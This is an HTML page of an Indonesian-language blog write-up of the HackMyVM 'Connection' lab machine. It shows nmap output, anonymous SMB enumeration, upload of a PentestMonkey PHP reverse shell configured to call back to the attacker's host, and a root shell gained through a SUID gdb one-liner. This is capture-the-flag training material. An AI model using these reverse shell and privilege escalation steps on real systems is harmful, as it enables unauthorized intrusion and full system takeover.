@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackMyVM: Connection | sharpicx</title>
+<meta name="generator" content="Jekyll v4.3.1" />
+<meta property="og:title" content="HackMyVM: Connection" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="kebosanan masih menyerang sampai hari ke 2 dari pertama kali bermain HackMyVM. Baru dapat dilema pengen kembali main HTB sama pengen coba mesin-mesin di HMV. Haduh bingung men, jadi saya memutuskan untuk melanjutkan mesin ke 3 dari awal, dengan nama mesin Connection yang mungkin masih dalam difficult easy." />
+<meta property="og:description" content="kebosanan masih menyerang sampai hari ke 2 dari pertama kali bermain HackMyVM. Baru dapat dilema pengen kembali main HTB sama pengen coba mesin-mesin di HMV. Haduh bingung men, jadi saya memutuskan untuk melanjutkan mesin ke 3 dari awal, dengan nama mesin Connection yang mungkin masih dalam difficult easy." />
+<link rel="canonical" href="http://localhost:4000/2021/05/13/hmv-connection" />
+<meta property="og:url" content="http://localhost:4000/2021/05/13/hmv-connection" />
+<meta property="og:site_name" content="sharpicx" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-13T22:33:36+07:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackMyVM: Connection" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-13T22:33:36+07:00","datePublished":"2021-05-13T22:33:36+07:00","description":"kebosanan masih menyerang sampai hari ke 2 dari pertama kali bermain HackMyVM. Baru dapat dilema pengen kembali main HTB sama pengen coba mesin-mesin di HMV. Haduh bingung men, jadi saya memutuskan untuk melanjutkan mesin ke 3 dari awal, dengan nama mesin Connection yang mungkin masih dalam difficult easy.","headline":"HackMyVM: Connection","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/05/13/hmv-connection"},"url":"http://localhost:4000/2021/05/13/hmv-connection"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<meta name="keywords" content="smb,ftp,suid,gdb,gtfobins" />
+
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="apple-touch-icon" href="/favicon.ico"/>
+<link rel="alternate" type="application/rss+xml" title="sharpicx - linux & cybersecurity big fan " href="/feed.xml" />
+<link rel="stylesheet" type="text/css" href="/assets/css/base.css" />
+<link rel="stylesheet" type="text/css" href="/assets/css/highlight.css" />
+<!-- <link rel="stylesheet" href="https://hackerthemes.com/bootstrap-themes/demo/theme-machine/neon-glow/css/bootstrap4-neon-glow.min.css"> -->
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
+
+<!--[if lt IE 9]>
+  <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+<![endif]-->
+
+
+<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async ></script>
+
+
+<script src="/assets/script/jekyllpaper.js" async ></script>
+<script src="https://unpkg.com/mermaid@8.5.1/dist/mermaid.min.js" onload="javascript:loadMermaid();" async></script>
+
+
+</head>
+<body>
+  <div class="container-wrapper">
+    <header class="container-header">
+      <div class="header-info">
+  <span class="header-info-name">sharpicx</span><br/>
+  <span class="header-info-desc" style="padding-left: 25px">linux & cybersecurity big fan </span>
+</div>
+<nav class="header-nav">
+  <ul class="header-main-nav">
+  
+    <li class="header-main-nav-item"><a href="/">home</a></li>
+  
+    <li class="header-main-nav-item"><a href="/category">categories</a></li>
+  
+    <li class="header-main-nav-item"><a href="/about">whoami</a></li>
+  
+  </ul>
+</nav>
+
+    </header>
+    <main class="container-main">
+      <article class="container-post">
+  <div class="post-title" style="padding: 0px 0px 20px 0px">
+    <h1>HackMyVM: Connection</h1>
+  </div>
+  <div class="post-author">
+    <span>sharpicx</span>
+  </div>
+  <div class="post-content">
+    <p>kebosanan masih menyerang sampai hari ke 2 dari pertama kali bermain <a href="https://hackmyvm.eu">HackMyVM</a>. Baru dapat dilema pengen kembali main <a href="https://hackthebox.eu">HTB</a> sama pengen coba mesin-mesin di <a href="https://hackmyvm.eu">HMV</a>. Haduh bingung men, jadi saya memutuskan untuk melanjutkan mesin ke 3 dari awal, dengan nama mesin <a href="https://hackmyvm.eu/machines/machine.php?vm=Connection">Connection</a> yang mungkin masih dalam difficult easy.</p>
+
+<h2 id="contents">Contents</h2>
+<ul>
+  <li><a href="#recon">Reconnaissance</a>
+    <ul>
+      <li><a href="#netdiscover">Getting IP Host Machine</a></li>
+      <li><a href="#nmap">Ports</a></li>
+    </ul>
+  </li>
+  <li><a href="#data">Shell as www-data</a></li>
+  <li><a href="#privesc">PrivEsc</a></li>
+</ul>
+
+<h2 id="recon">Recon</h2>
+<h3 id="netdiscover">Getting IP Host Machine</h3>
+<p><img src="https://i.postimg.cc/XvNJhLmk/connection-1.png" alt="netdiscover" /></p>
+
+<h3 id="nmap">Ports</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>auvia connection <span class="c"># nmap -A -sCV connection.hmv -oN scan_new.nmap</span>
+
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-13 19:23 WIB
+Nmap scan report <span class="k">for </span>connection.hmv <span class="o">(</span>192.168.56.111<span class="o">)</span>
+Host is up <span class="o">(</span>0.00034s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 996 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http        Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Apache2 Debian Default Page: It works
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+MAC Address: 08:00:27:55:A1:39 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+Device <span class="nb">type</span>: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: Host: CONNECTION<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h19m52s, deviation: 2h18m34s, median: <span class="nt">-7s</span>
+|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+| smb-os-discovery: 
+|   OS: Windows 6.1 <span class="o">(</span>Samba 4.9.5-Debian<span class="o">)</span>
+|   Computer name: connection
+|   NetBIOS computer name: CONNECTION<span class="se">\x</span>00
+|   Domain name: <span class="se">\x</span>00
+|   FQDN: connection
+|_  System <span class="nb">time</span>: 2021-05-30T08:23:38-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-05-30T12:23:38
+|_  start_date: N/A
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.34 ms connection.hmv <span class="o">(</span>192.168.56.111<span class="o">)</span>
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>15.58 seconds
+
+</code></pre></div></div>
+<p>Ports scanned, SSH (22), HTTP (80), Samba (139, 445). What is <a href="https://www.samba.org/samba/what_is_samba.html">Samba</a>? probably like suatu komponen penting Unix yang terintegrasi dengan mulus terhadap lingkungan directory aktif (source: <a href="https://samba.org">https://samba.org</a>). So, saya disini akan menggunakan <strong>smbclient</strong> untuk melihat-lihat direktori yang aktif. Di mesin ini kita akan masuk dan login sebagai <em>guest</em> saja. terlihat dari scanning nmap diatas.</p>
+<div class="language-s highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">|</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="o">:</span><span class="w"> 
+</span><span class="o">|</span><span class="w">   </span><span class="n">account_used</span><span class="o">:</span><span class="w"> </span><span class="n">guest</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="data">Shell as www-data</h2>
+<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">aoba</span> <span class="n">connection</span> <span class="p">#</span> <span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="o">////</span><span class="n">connection</span><span class="p">.</span><span class="n">hmv</span>
+<span class="n">smbclient</span><span class="p">:</span> <span class="n">Can</span><span class="c1">'t load /etc/samba/smb.conf - run testparm to debug it</span>
+<span class="n">Enter</span> <span class="n">WORKGROUP</span><span class="o">\</span><span class="n">root</span><span class="c1">'s password: </span>
+<span class="n">Anonymous</span> <span class="n">login</span> <span class="n">successful</span>
+
+	<span class="n">Sharename</span>       <span class="n">Type</span>      <span class="n">Comment</span>
+	<span class="o">---------</span>       <span class="o">----</span>      <span class="o">-------</span>
+	<span class="n">share</span>           <span class="n">Disk</span>      
+	<span class="n">print$</span>          <span class="n">Disk</span>      <span class="n">Printer</span> <span class="n">Drivers</span>
+	<span class="n">IPC</span><span class="err">$</span>            <span class="n">IPC</span>       <span class="n">IPC</span> <span class="n">Service</span> <span class="p">(</span><span class="k">Private</span> <span class="n">Share</span> <span class="n">for</span> <span class="n">uploading</span> <span class="n">files</span><span class="p">)</span>
+<span class="n">SMB1</span> <span class="n">disabled</span> <span class="o">--</span> <span class="n">no</span> <span class="n">workgroup</span> <span class="n">available</span>
+</code></pre></div></div>
+<p>disitu terlihat directory <code class="language-plaintext highlighter-rouge">share</code> aktif sebagai sarana saya untuk masuk dan mengunggah sebuah reverse shell PHP yang dibuat oleh <a href="https://pentestmonkey.net">PentestMonkey</a>.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'192.168.56.1'</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
+<span class="nv">$port</span> <span class="o">=</span> <span class="mi">1337</span><span class="p">;</span>       <span class="c1">// CHANGE THIS</span>
+<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
+<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="p">;</span>
+<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div></div>
+<p>lalu kita unggah reverse shell tadi via <em>smbclient</em>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aoba connection <span class="c"># ls</span>
+index.html  passwd  scan_new.nmap  scan.nmap  shell.php
+aoba connection <span class="c"># smbclient \\\\connection.hmv\\share</span>
+smbclient: Can<span class="s1">'t load /etc/samba/smb.conf - run testparm to debug it
+Enter WORKGROUP\root'</span>s password: 
+Anonymous login successful
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Wed Sep 23 08:48:39 2020
+  ..                                  D        0  Wed Sep 23 08:48:39 2020
+  html                                D        0  Wed Sep 23 09:20:00 2020
+
+		7158264 blocks of size 1024. 5462860 blocks available
+smb: <span class="se">\&gt;</span> <span class="nb">cd </span>html
+smb: <span class="se">\h</span>tml<span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Wed Sep 23 09:20:00 2020
+  ..                                  D        0  Wed Sep 23 08:48:39 2020
+  index.html                          N    10701  Wed Sep 23 08:48:45 2020
+
+		7158264 blocks of size 1024. 5462860 blocks available
+smb: <span class="se">\h</span>tml<span class="se">\&gt;</span> put shell.php
+putting file shell.php as <span class="se">\h</span>tml<span class="se">\s</span>hell.php <span class="o">(</span>45.1 kb/s<span class="o">)</span> <span class="o">(</span>average 45.1 kb/s<span class="o">)</span>
+smb: <span class="se">\h</span>tml<span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Wed Jun  2 01:34:56 2021
+  ..                                  D        0  Wed Sep 23 08:48:39 2020
+  index.html                          N    10701  Wed Sep 23 08:48:45 2020
+  shell.php                           A     5494  Wed Jun  2 01:34:56 2021
+
+		7158264 blocks of size 1024. 5462852 blocks available
+smb: <span class="se">\h</span>tml<span class="se">\&gt;</span> 
+</code></pre></div></div>
+<p>jika ingin lebih gampang, kalian (para pembaca) bisa menginstall lewat package manager yang ada pada distro kalian masing-masing.</p>
+<div class="language-s highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">auvia</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="c1"># pacman -S webshells</span><span class="w">
+</span></code></pre></div></div>
+<p>dan itu akan terinstall automatically ke mesin kalian pada directory <strong>/usr/share/webshells</strong>.</p>
+
+<p>tell me if im leet.</p>
+
+<p><img src="https://i.postimg.cc/sDZkGcZL/connection-2.png" alt="img" /></p>
+
+<h2 id="privesc">PrivEsc</h2>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+www-data@connection:/<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
+</code></pre></div></div>
+<p>line pertama, untuk memunculkan bash yang nyaman dipandang. sedangkan line kedua untuk you knowlah kenyamanan terminal <code class="language-plaintext highlighter-rouge">xterm-256color</code>. dan ya, mari kita cek SUID dulu untuk menemukan binary yang bisa tingkat lanjut ke tahap ekskalasi root.</p>
+<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">www</span><span class="p">-</span><span class="n">data@connection</span><span class="p">:/</span><span class="err">$</span> <span class="n">find</span> <span class="p">/</span> <span class="p">-</span><span class="n">perm</span> <span class="p">-</span><span class="m">4000</span> <span class="m">2</span><span class="p">&gt;/</span><span class="n">dev</span><span class="p">/</span><span class="k">null</span>
+<span class="n">find</span> <span class="p">/</span> <span class="p">-</span><span class="n">perm</span> <span class="p">-</span><span class="m">4000</span> <span class="m">2</span><span class="p">&gt;/</span><span class="n">dev</span><span class="p">/</span><span class="k">null</span>
+<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">eject</span><span class="p">/</span><span class="n">dmcrypt</span><span class="p">-</span><span class="k">get</span><span class="p">-</span><span class="n">device</span>
+<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">dbus</span><span class="p">-</span><span class="m">1.0</span><span class="p">/</span><span class="n">dbus</span><span class="p">-</span><span class="n">daemon</span><span class="p">-</span><span class="n">launch</span><span class="p">-</span><span class="n">helper</span>
+<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">openssh</span><span class="p">/</span><span class="n">ssh</span><span class="p">-</span><span class="n">keysign</span>
+<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">newgrp</span>
+<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">umount</span>
+<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">su</span>
+<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">passwd</span>
+<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">gdb</span>
+<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">chsh</span>
+<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">chfn</span>
+<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">mount</span>
+<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">gpasswd</span>
+
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">gdb</code> adalah sesuatu yang menarik untuk dijadikan bahan ekskalasi. <a href="https://gtfobins.github.io">gtfobins</a> lagi dan lagi…</p>
+
+<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">www</span><span class="o">-</span><span class="n">data@connection</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">nx</span> <span class="o">-</span><span class="n">ex</span> <span class="c1">'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit</span>
+<span class="s">"-p"</span><span class="p">)</span><span class="c1">' -ex quitthon import os; os.execl("/bin/sh", "sh", "</span>
+<span class="n">GNU</span> <span class="n">gdb</span> <span class="p">(</span><span class="n">Debian</span> <span class="mf">8.2</span><span class="p">.</span><span class="err">1-2+</span><span class="n">b3</span><span class="p">)</span> <span class="mf">8.2</span><span class="p">.</span><span class="err">1</span>
+<span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">2018</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc</span><span class="p">.</span>
+<span class="n">License</span> <span class="n">GPLv3</span><span class="o">+</span><span class="p">:</span> <span class="n">GNU</span> <span class="n">GPL</span> <span class="n">version</span> <span class="mi">3</span> <span class="n">or</span> <span class="n">later</span> <span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gnu</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">licenses</span><span class="o">/</span><span class="n">gpl</span><span class="p">.</span><span class="n">html</span><span class="o">&gt;</span>
+<span class="n">This</span> <span class="n">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">:</span> <span class="n">you</span> <span class="n">are</span> <span class="n">free</span> <span class="n">to</span> <span class="n">change</span> <span class="n">and</span> <span class="n">redistribute</span> <span class="n">it</span><span class="p">.</span>
+<span class="n">There</span> <span class="n">is</span> <span class="n">NO</span> <span class="n">WARRANTY</span><span class="p">,</span> <span class="n">to</span> <span class="n">the</span> <span class="n">extent</span> <span class="n">permitted</span> <span class="n">by</span> <span class="n">law</span><span class="p">.</span>
+<span class="n">Type</span> <span class="s">"show copying"</span> <span class="n">and</span> <span class="s">"show warranty"</span> <span class="n">for</span> <span class="n">details</span><span class="p">.</span>
+<span class="n">This</span> <span class="n">GDB</span> <span class="n">was</span> <span class="n">configured</span> <span class="n">as</span> <span class="s">"x86_64-linux-gnu"</span><span class="p">.</span>
+<span class="n">Type</span> <span class="s">"show configuration"</span> <span class="n">for</span> <span class="n">configuration</span> <span class="n">details</span><span class="p">.</span>
+<span class="n">For</span> <span class="n">bug</span> <span class="n">reporting</span> <span class="n">instructions</span><span class="p">,</span> <span class="n">please</span> <span class="n">see</span><span class="p">:</span>
+<span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">gnu</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">software</span><span class="o">/</span><span class="n">gdb</span><span class="o">/</span><span class="n">bugs</span><span class="o">/&gt;</span><span class="p">.</span>
+<span class="n">Find</span> <span class="n">the</span> <span class="n">GDB</span> <span class="n">manual</span> <span class="n">and</span> <span class="n">other</span> <span class="n">documentation</span> <span class="n">resources</span> <span class="n">online</span> <span class="n">at</span><span class="p">:</span>
+    <span class="o">&lt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">gnu</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">software</span><span class="o">/</span><span class="n">gdb</span><span class="o">/</span><span class="n">documentation</span><span class="o">/&gt;</span><span class="p">.</span>
+
+<span class="n">For</span> <span class="n">help</span><span class="p">,</span> <span class="n">type</span> <span class="s">"help"</span><span class="p">.</span>
+<span class="n">Type</span> <span class="s">"apropos word"</span> <span class="n">to</span> <span class="n">search</span> <span class="n">for</span> <span class="n">commands</span> <span class="n">related</span> <span class="n">to</span> <span class="s">"word"</span><span class="p">.</span>
+<span class="err">#</span> <span class="n">cd</span> <span class="o">/</span><span class="n">root</span>
+<span class="p">#</span> <span class="n">ls</span>
+<span class="n">ls</span>
+<span class="n">proof</span><span class="p">.</span><span class="n">txt</span>
+<span class="p">#</span> <span class="n">cat</span> <span class="n">proof</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">a7c6ea4931ab86fb54c540xxxxxxxxxx</span>
+</code></pre></div></div>
+
+  </div>
+  <div class="post-info" style="padding-top: 25px">
+    <div class="post-date">
+      2021-05-13.
+    </div>
+    <div class="post-categories">
+      <span></span>
+      
+      <a href="/category/hackmyvm" class="post-category">hackmyvm</a>
+      
+    </div>
+    <div class="post-tags">
+      <span></span>
+      
+      <a href="/tag/smb" class="post-tag">smb</a>
+      
+      <a href="/tag/ftp" class="post-tag">ftp</a>
+      
+      <a href="/tag/suid" class="post-tag">suid</a>
+      
+      <a href="/tag/gdb" class="post-tag">gdb</a>
+      
+      <a href="/tag/gtfobins" class="post-tag">gtfobins</a>
+      
+    </div>
+    <div class="post-tools">
+      
+      <div>
+        <span></span><a href="/2021/06/16/htb-spectra">HackTheBox: Spectra</a>
+      </div>
+      
+      
+      <div>
+        <span></span><a href="/2021/05/12/hmv-pwned">HackMyVM: Pwned</a>
+      </div>
+      
+    </div>
+    
+  </div>
+</article>
+
+    </main>
+    <footer class="container-footer">
+      <div class="footer-copyright">
+  <span class="footer-copyright-text float-left">Copyright &copy; 2022.  sharpicx.</span>
+  <span class="footer-copyright-text float-right">
+    Powered by <a href="https://jekyllrb.com/">Jekyll</a>
+  </span>
+</div>
+
+    </footer>
+  </div>
+</body>
+</html>
